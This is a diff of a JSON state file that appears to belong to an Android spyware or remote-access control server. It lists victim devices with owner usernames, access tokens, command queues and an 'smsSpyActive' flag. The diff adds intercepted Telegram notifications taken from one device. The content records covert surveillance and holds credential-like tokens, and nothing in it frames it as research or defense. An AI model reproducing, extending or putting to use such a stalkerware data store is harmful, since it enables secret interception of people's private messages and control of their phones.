@@ -9586,7 +9586,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776769146843,
+    "lastSeen": 1776769170894,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -9627,7 +9627,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776769146524,
+    "lastSeen": 1776769172132,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -9643,6 +9643,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 17:59",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776769172469
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "❄️ Akun Terhapuss・16948 pesan baru dari 115 obrolan",
+        "time": "21/04 17:59",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776769172376
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
@@ -13580,7 +13596,7 @@
     "deviceName": "HP-BBBB-732D",
     "ownerUsername": "pian",
     "token": "06c7d23d86c7cc434c3d79ed0920fb91",
-    "lastSeen": 1776769147158,
+    "lastSeen": 1776769171060,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:59:07.158Z",
